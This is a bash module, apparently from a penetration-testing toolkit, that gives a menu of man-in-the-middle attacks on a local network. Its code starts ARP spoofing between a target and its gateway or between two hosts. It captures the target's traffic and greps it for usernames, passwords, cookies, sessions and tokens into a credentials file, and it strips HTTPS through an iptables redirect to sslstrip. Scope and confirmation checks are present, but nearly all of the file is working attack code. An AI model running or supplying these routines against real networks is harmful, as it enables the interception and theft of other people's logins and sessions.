#!/bin/bash
# ARP spoofing and MITM attacks

rt_mitm() {
  local choice
  choice=$(menu_pick "MITM Attacks" \
    "ARP Spoof (gateway)" \
    "ARP Spoof (targeted)" \
    "Full MITM (with capture)" \
    "SSL Strip" \
    "Stop MITM")
  
  case "$choice" in
    1) mitm_arp_gateway ;;
    2) mitm_arp_targeted ;;
    3) mitm_full ;;
    4) mitm_sslstrip ;;
    5) mitm_stop ;;
    0|"") return ;;
  esac
}

mitm_arp_gateway() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - ARP spoofing blocked"
    return 1
  fi
  
  if ! confirm_danger "Start ARP spoofing? This will intercept traffic between target and gateway."; then
    return 1
  fi
  
  local target
  target=$(IP_PICKER "Target IP" "192.168.1.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local gateway
  gateway=$(IP_PICKER "Gateway IP" "192.168.1.1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting ARP spoof: $target <-> $gateway"
  
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || \
    sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
  
  if have arpspoof; then
    nohup arpspoof -i "$iface" -t "$target" "$gateway" > "$ARTIFACT_DIR/arpspoof1.log" 2>&1 &
    echo $! > /tmp/mitm_arp1.pid
    
    nohup arpspoof -i "$iface" -t "$gateway" "$target" > "$ARTIFACT_DIR/arpspoof2.log" 2>&1 &
    echo $! > /tmp/mitm_arp2.pid
    
    LOG green "ARP spoof started (bidirectional)"
    LOG "Target: $target"
    LOG "Gateway: $gateway"
    LOG ""
    LOG "Traffic now flows through this device"
    LOG "Stop with: MITM > Stop MITM"
  elif have ettercap; then
    nohup ettercap -T -q -i "$iface" -M arp:remote /"$target"// /"$gateway"// > "$ARTIFACT_DIR/ettercap.log" 2>&1 &
    echo $! > /tmp/mitm_ettercap.pid
    LOG green "Ettercap MITM started"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    laptop_exec_bg "arpspoof -i eth0 -t '$target' '$gateway'" "$LAPTOP_RESULTS_DIR/arpspoof.log"
    LOG green "ARP spoof started on laptop"
  else
    LOG red "arpspoof or ettercap required"
    return 1
  fi
}

mitm_arp_targeted() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Start targeted ARP spoof between two hosts?"; then
    return 1
  fi
  
  local target1
  target1=$(IP_PICKER "Target 1" "192.168.1.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local target2
  target2=$(IP_PICKER "Target 2" "192.168.1.200")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target1" || ! in_scope "$target2"; then
    LOG red "Targets must be in scope"
    return 1
  fi
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting targeted ARP spoof: $target1 <-> $target2"
  
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
  
  if have arpspoof; then
    nohup arpspoof -i "$iface" -t "$target1" "$target2" > "$ARTIFACT_DIR/arpspoof1.log" 2>&1 &
    echo $! > /tmp/mitm_arp1.pid
    
    nohup arpspoof -i "$iface" -t "$target2" "$target1" > "$ARTIFACT_DIR/arpspoof2.log" 2>&1 &
    echo $! > /tmp/mitm_arp2.pid
    
    LOG green "Targeted ARP spoof active"
  else
    LOG red "arpspoof required"
  fi
}

mitm_full() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Start full MITM with traffic capture?"; then
    return 1
  fi
  
  local target
  target=$(IP_PICKER "Target IP" "192.168.1.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local gateway
  gateway=$(IP_PICKER "Gateway IP" "192.168.1.1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local duration
  duration=$(NUMBER_PICKER "Capture duration (sec)" 300)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting full MITM with capture..."
  
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
  ensure_dir "$ARTIFACT_DIR"
  
  local pcap_file="$ARTIFACT_DIR/mitm_capture_$(ts).pcap"
  local creds_file="$ARTIFACT_DIR/mitm_creds_$(ts).txt"
  
  if have arpspoof; then
    nohup arpspoof -i "$iface" -t "$target" "$gateway" >/dev/null 2>&1 &
    echo $! > /tmp/mitm_arp1.pid
    nohup arpspoof -i "$iface" -t "$gateway" "$target" >/dev/null 2>&1 &
    echo $! > /tmp/mitm_arp2.pid
  fi
  
  if have tcpdump; then
    LOG "Capturing traffic to: $pcap_file"
    
    run_timeboxed "$duration" tcpdump -i "$iface" -w "$pcap_file" \
      "host $target" 2>/dev/null &
    local tcpdump_pid=$!
    
    {
      echo "=== MITM Credential Capture ==="
      echo "Target: $target"
      echo "Start: $(date)"
      echo ""
      
      run_timeboxed "$duration" tcpdump -i "$iface" -A -s 0 "host $target" 2>/dev/null | \
        grep -iE '(user|pass|login|pwd|auth|cookie|session|token)' | head -200
        
    } > "$creds_file" &
    
    LOG green "MITM active - capturing for $duration seconds"
    LOG "PCAP: $pcap_file"
    LOG "Creds: $creds_file"
    
    wait $tcpdump_pid 2>/dev/null
    mitm_stop
    LOG green "Capture complete"
  else
    LOG red "tcpdump required for capture"
  fi
}

mitm_sslstrip() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Start SSL stripping? This will downgrade HTTPS to HTTP."; then
    return 1
  fi
  
  local target
  target=$(IP_PICKER "Target IP" "192.168.1.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local gateway
  gateway=$(IP_PICKER "Gateway IP" "192.168.1.1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting SSL strip attack..."
  
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
  
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 2>/dev/null
  
  if have arpspoof; then
    nohup arpspoof -i "$iface" -t "$target" "$gateway" >/dev/null 2>&1 &
    echo $! > /tmp/mitm_arp1.pid
    nohup arpspoof -i "$iface" -t "$gateway" "$target" >/dev/null 2>&1 &
    echo $! > /tmp/mitm_arp2.pid
  fi
  
  if have sslstrip; then
    nohup sslstrip -l 10000 -w "$ARTIFACT_DIR/sslstrip_$(ts).log" >/dev/null 2>&1 &
    echo $! > /tmp/mitm_sslstrip.pid
    LOG green "SSLstrip active on port 10000"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    laptop_exec_bg "sslstrip -l 10000 -w $LAPTOP_RESULTS_DIR/sslstrip.log" "$LAPTOP_RESULTS_DIR/sslstrip_run.log"
    LOG green "SSLstrip started on laptop"
  else
    LOG red "sslstrip not available"
    LOG "Install with: pip install sslstrip"
  fi
  
  LOG ""
  LOG "Stripped connections logged to artifacts"
  LOG "Stop with: MITM > Stop MITM"
}

mitm_stop() {
  LOG blue "Stopping MITM attacks..."
  
  for pidfile in /tmp/mitm_*.pid; do
    if [[ -f "$pidfile" ]]; then
      kill "$(cat "$pidfile")" 2>/dev/null
      rm -f "$pidfile"
    fi
  done
  
  pkill -f arpspoof 2>/dev/null || true
  pkill -f ettercap 2>/dev/null || true
  pkill -f sslstrip 2>/dev/null || true
  
  iptables -t nat -F PREROUTING 2>/dev/null || true
  
  echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
  
  LOG green "MITM stopped"
}
